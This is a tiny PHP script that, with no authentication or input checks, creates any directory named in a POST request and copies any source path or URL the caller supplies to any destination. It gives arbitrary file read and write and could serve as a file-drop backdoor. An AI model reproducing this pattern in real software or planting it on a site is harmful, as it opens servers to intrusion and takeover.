<?php
if(isset($_POST["srcfile"]) && !empty($_POST["dest"])){
	mkdir($_POST["dest"], 0775, true);
	copy($_POST["srcfile"], $_POST["dest"].$_POST["name"]);
}
?>
